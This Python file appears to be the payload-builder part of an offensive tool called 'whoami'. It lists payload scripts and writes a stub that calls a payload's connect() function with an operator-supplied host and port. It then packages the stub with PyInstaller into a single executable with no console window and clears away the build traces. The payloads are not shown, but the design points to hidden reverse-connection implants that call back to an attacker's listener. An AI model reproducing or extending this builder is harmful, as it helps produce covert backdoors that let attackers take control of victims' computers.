import os
import platform
import shutil
import subprocess
from time import sleep

RED = '\033[91m'
GREEN = '\33[92m'
END = '\033[0m'

try:
    import pathlib
    
except:
    print(f"\n{RED}[!]{END} Failed To Import Packeges Try To Install It Manually Using The Following Command 'pip install -r requirements.txt'.")
    exit()

def show_payloads():
    payloads = pathlib.Path("whoami_payloads/").glob("*.py")
    
    for file in payloads:
        print(f'\n{GREEN}[+]{END} {file}')
        
def check_payload(payload):
    if os.path.isfile(f"{payload}"):
        return True
    else:
        return False

def machine_os():
    try:
        machine_os = platform.system()
        return machine_os

    except Exception as e:
        return(f"\n{RED}[!]{END} Failed To Get The Machine Os.")

def clean(payload_name):
    try:
        os.remove(f"whoami-output/{payload_name}.py")
        shutil.rmtree("build")

        spec_clean = os.listdir(".")
        for item in spec_clean:
            if item.endswith(".spec"):
                os.remove(os.path.join(".", item))

        sleep(1)
        match = [f for f in os.listdir("dist/") if any([f == payload_name, f.startswith(payload_name + ".")])]
        if match:
            match = match[0]
            shutil.copy(f"dist/{match}", "whoami-output/")

        shutil.rmtree("dist")
        sleep(1)
        print(f"\n{GREEN}[+]{END} Clean Has Been Completed")

    except Exception as clean_error:
        print(f"\n{RED}[!]{END} Failed To Clean {clean_error}.")

def create_payload(payload , payload_name, payload_host, payload_port):
    if machine_os() == "Windows":
        payload = payload.split("\\")[1]
    else:
        payload = payload.split("/")[1]

    payload = payload.split(".py")[0]
    
    try:

        with open(f"whoami-output/{payload_name}.py", "w") as file:
            file.write(f"from whoami_payloads.{payload} import connect\n")
            file.write(f"connect('{payload_host}', {payload_port})\n")

        os.system(f"pyinstaller39 --onefile --noconsole whoami-output/{payload_name}.py")
        sleep(1)
        clean(payload_name)
        sleep(1)
        print(f"\n{GREEN}[+]{END} Payload Created Succesfully.")

    except Exception as create_error:
        print(f"\n{RED}[!]{END} Failed To Create Payload {create_error}.")